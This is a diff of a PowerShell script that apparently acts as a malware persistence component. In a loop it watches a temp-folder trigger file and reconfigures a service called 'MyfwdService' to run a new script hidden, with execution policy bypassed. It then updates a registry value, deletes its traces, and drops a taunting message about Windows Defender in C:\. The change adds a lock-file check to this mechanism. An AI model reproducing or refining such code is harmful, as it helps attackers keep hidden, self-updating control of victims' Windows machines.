@@ -84,18 +84,22 @@ function Get-ServiceName{
 while ($true) {
     $x = Get-ServiceReg -path $regPath
     $y = Get-ServiceName -name $serviceName
-    if(Test-Path -Path "$env:temp\jMEmdVuJAtNea.txt" -PathType Leaf){
+    if((Test-Path -Path "$env:temp\_ready.lock" -PathType Leaf) -and (Test-Path -Path "$env:temp\jMEmdVuJAtNea.txt" -PathType Leaf)){
         $fwdName = Get-Content -Path "$env:temp\jMEmdVuJAtNea.txt"
-        $it = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
-        if($it){
-            $fwdPath = $it.$propertyName
+        $fwdName = $fwdName.Trim()
+        if($null -ne $fwdName -and $fwdName -ne ""){
+            $it = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
+            if($it){
+                $fwdPath = $it.$propertyName
+            }
+            $fwdPath = "$([System.IO.Path]::GetDirectoryName($fwdPath))\$fwdName"
+            $arg = "-ep bypass -nop -w hidden $fwdPath"
+            & $exe set "MyfwdService" AppParameters $arg
+            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
+            Remove-Item -Path "$env:temp\_ready.lock" -Force
+            Remove-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -Force
+            echo "GET LAID WINDOWS DF XD" >> "C:\LAID.txt"
         }
-        $fwdPath = "$([System.IO.Path]::GetDirectoryName($fwdPath))\$fwdName"
-        $arg = "-ep bypass -nop -w hidden $fwdPath"
-        & $exe set "MyfwdService" AppParameters $arg
-        Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
-        Remove-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -Force
-        echo "GET LAID WINDOWS DF XD" >> "C:\LAID.txt"
     }
     if(-not(Test-Path -Path $fwdPath -PathType Leaf)){
         if(-not($issetup)){
